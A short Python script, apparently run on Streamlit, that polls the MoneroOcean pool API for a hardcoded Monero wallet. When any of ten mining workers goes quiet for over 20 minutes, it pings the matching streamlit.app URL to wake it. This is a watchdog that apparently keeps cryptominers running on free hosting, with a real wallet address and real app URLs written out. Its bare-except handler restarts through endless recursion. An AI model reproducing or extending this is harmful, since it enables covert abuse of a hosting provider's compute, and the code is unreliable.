import requests
import streamlit as st 
import json
import time
from multiprocessing import Process

pool = "https://api.moneroocean.stream/miner/"
addr ="49FrBm432j9fg33N8PrwSiSig7aTrxZ1wY4eELssmkmeESaYzk2fPkvfN7Kj4NHMfH11NuhUAcKc5DkP7jZQTvVGUnD243g"
stats ="/stats/"


def resp(worker):
  
  host = pool + addr + stats + worker
  res = requests.get(host)
  time.sleep(10)
  jde = json.loads(str(res.text))
  workt = jde[("lts")]
  t = time.time()
  lst = t - workt
  lstnt = lst / 60
  if lstnt >= 20:
    #mv4
    if worker == "mv7gen1":
      requests.get("https://vyom00907-mv7-mv7gen1-txg47k.streamlit.app/")
    if worker == "mv7gen2":
      requests.get("https://vyom00907-mv7-mv7gen2-ew0px4.streamlit.app/")
    if worker == "mv7gen3":
      requests.get("https://vyom00907-mv7-mv7gen3-2p86o2.streamlit.app/")
    if worker == "mv7gen4":
      requests.get("https://vyom00907-mv7-mv7gen4-gfb5iz.streamlit.app/")
    if worker == "mv7gen5":
      requests.get("https://vyom00907-mv7-mv7gen5-eh0991.streamlit.app/")
    if worker == "mv7gen6":
      requests.get("https://vyom00907-mv7-mv7gen6-f9h1t8.streamlit.app/")
    if worker == "mv7gen7":
      requests.get("https://vyom00907-mv7-mv7gen7-rnsrye.streamlit.app/")
    if worker == "mv7gen8":
      requests.get("https://vyom00907-mv7-mv7gen8-cmq1n6.streamlit.app/")
    if worker == "mv7gen9":
      requests.get("https://vyom00907-mv7-mv7gen9-q6ka3x.streamlit.app/")
    if worker == "mv7gen10":
      requests.get("https://vyom00907-mv7-mv7gen10-9sp0gi.streamlit.app/")
    
      

def stch():
    while 1==1 :
      
      #mv4
      resp("mv7gen1")
      resp("mv7gen2")
      resp("mv7gen3")
      resp("mv7gen4")
      resp("mv7gen5")
      resp("mv7gen6")
      resp("mv7gen7")
      resp("mv7gen8")
      resp("mv7gen9")
      resp("mv7gen10")

def ch():
  try:
    stch()
  except:
    ch()

  
proc = Process(target=ch ,args=())
proc.start()

  
